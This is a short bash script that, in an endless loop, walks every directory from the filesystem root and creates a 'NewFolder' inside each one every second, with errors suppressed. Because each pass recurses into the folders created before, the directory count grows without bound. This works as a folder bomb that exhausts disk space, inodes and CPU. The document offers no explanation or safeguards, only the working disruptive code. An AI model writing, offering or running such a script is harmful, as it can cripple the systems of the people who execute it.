#!/bin/bash
TARGET_DIRECTORY="/"
NEW_FOLDER_NAME="NewFolder"
create_folder() {
    for dir in $(find $1 -type d); do
        mkdir -p "$dir/$NEW_FOLDER_NAME" 2>/dev/null
    done
}
while true; do
    create_folder "$TARGET_DIRECTORY"
    sleep 1
done
